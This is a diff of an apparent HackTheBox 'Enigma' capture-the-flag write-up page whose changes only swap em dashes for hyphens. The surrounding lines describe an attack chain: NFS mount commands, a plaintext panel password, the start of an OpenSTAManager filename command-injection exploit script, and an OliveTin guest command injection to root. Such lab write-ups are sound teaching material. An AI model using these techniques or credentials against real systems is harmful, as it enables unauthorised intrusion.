@@ -4,7 +4,7 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta name="theme-color" content="#030305"/>
-<title>Enigma — HTB Write Up | pumkin</title>
+<title>Enigma - HTB Write Up | pumkin</title>
 <meta name="description" content="HackTheBox Enigma (Easy, Linux) full write up: NFS share → mail credential reuse → OpenSTAManager RCE → database creds → OliveTin config injection → root."/>
 <link rel="icon" href="../cat.png"/>
 <style>
@@ -76,7 +76,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
       </div>
 
       <h2>Summary</h2>
-      <p>Enigma chains a handful of classic techniques together. A <strong>misconfigured NFS share</strong> leaks an internal PDF, which points to the mail server where <strong>credential reuse</strong> unlocks a hidden support panel running an <strong>authenticated RCE in OpenSTAManager</strong>. From the resulting <code>www-data</code> shell, database credentials found in config lead to a cracked hash and <code>haris</code>, whose port-forwarded service (<strong>OliveTin</strong>) has an unauthenticated action whose shell command is injectable — straight to root.</p>
+      <p>Enigma chains a handful of classic techniques together. A <strong>misconfigured NFS share</strong> leaks an internal PDF, which points to the mail server where <strong>credential reuse</strong> unlocks a hidden support panel running an <strong>authenticated RCE in OpenSTAManager</strong>. From the resulting <code>www-data</code> shell, database credentials found in config lead to a cracked hash and <code>haris</code>, whose port-forwarded service (<strong>OliveTin</strong>) has an unauthenticated action whose shell command is injectable - straight to root.</p>
 
       <h2>Skills Required</h2>
       <ul>
@@ -110,7 +110,7 @@ PORT     STATE SERVICE  VERSION
 2049/tcp open  nfs_acl  3 (RPC #100227)</pre>
 
       <h3>NFS share</h3>
-      <p>The presence of NFS is unusual — let's look at it. The <code>/share</code> export is mountable without auth.</p>
+      <p>The presence of NFS is unusual - let's look at it. The <code>/share</code> export is mountable without auth.</p>
       <pre>mkdir /tmp/nfs
 mount -t nfs TARGET:/share /tmp/nfs -o nolock    # mount share
 ls -la /tmp/nfs                                  # list files
@@ -118,7 +118,7 @@ umount /tmp/nfs</pre>
       <p>Inside is a PDF. It references the mail server and a user named <strong>Kevin</strong>, along with (implied) credentials.</p>
 
       <h3>Mail server</h3>
-      <p>Connecting to the POP3 service over TLS and reading Kevin's only email yields another set of credentials — this time for a hidden support panel.</p>
+      <p>Connecting to the POP3 service over TLS and reading Kevin's only email yields another set of credentials - this time for a hidden support panel.</p>
       <pre>openssl s_client -connect 10.129.35.69:995 -crlf -quiet
 
 URL: http://support_001.enigma.htb
@@ -129,7 +129,7 @@ Password: Ne3s4rtars78s</pre>
       <h3>OpenSTAManager authenticated RCE</h3>
       <p>The support panel runs <strong>OpenSTAManager 2.9.8</strong>. Research points to <strong>CVE-2025-69212</strong>, an authenticated RCE in the invoice importer: an uploaded <code>.p7m</code> file is passed to <code>exec('openssl smime -verify ... "'.$file.'"')</code> where the attacker-controlled filename is evaluated by <code>/bin/sh</code>. Since filenames can't contain <code>/</code>, the payload is base32-encoded and decoded at runtime.</p>
       <pre>#!/usr/bin/env python3
-# CVE-2025-69212 — OpenSTAManager &lt;= 2.9.8 authenticated RCE
+# CVE-2025-69212 - OpenSTAManager &lt;= 2.9.8 authenticated RCE
 # Sink: src/Util/XML.php :: decodeP7M()
 #   exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"')
 # Command substitution $( ) is evaluated by /bin/sh even inside double quotes.
@@ -209,7 +209,7 @@ ssh -i id_haris haris@enigma.htb</pre>
       <pre>ssh -i id_haris -L 1337:127.0.0.1:1337 haris@enigma.htb</pre>
 
       <h3>Unauthenticated command injection</h3>
-      <p>OliveTin's config defines a <code>backup_database</code> action that shells out to <code>mysqldump</code>, and it is configured with <code>authRequireGuestsToLogin: false</code> plus <code>exec: true</code> for guests — so anyone can trigger actions with arbitrary arguments, no login needed.</p>
+      <p>OliveTin's config defines a <code>backup_database</code> action that shells out to <code>mysqldump</code>, and it is configured with <code>authRequireGuestsToLogin: false</code> plus <code>exec: true</code> for guests - so anyone can trigger actions with arbitrary arguments, no login needed.</p>
       <pre># /etc/OliveTin/config.yaml
 - title: Backup Database
   id: backup_database
@@ -226,10 +226,10 @@ ssh -i id_haris haris@enigma.htb</pre>
 
       <h2>Key Takeaways</h2>
       <ul>
-        <li><strong>NFS exports with no auth</strong> are a free foothold — always mount and list them.</li>
+        <li><strong>NFS exports with no auth</strong> are a free foothold - always mount and list them.</li>
         <li><strong>Password reuse</strong> across mail, web panels and OS accounts makes one leak a whole path.</li>
-        <li><strong>Command substitution inside quoted <code>system()</code>/shell templates</strong> is injectable — never build shell commands from untrusted arguments.</li>
-        <li><strong>Look for the hidden vhosts</strong> — <code>support_001</code> only showed up after the mail lead, not from directory brute force.</li>
+        <li><strong>Command substitution inside quoted <code>system()</code>/shell templates</strong> is injectable - never build shell commands from untrusted arguments.</li>
+        <li><strong>Look for the hidden vhosts</strong> - <code>support_001</code> only showed up after the mail lead, not from directory brute force.</li>
       </ul>
 
     </div>
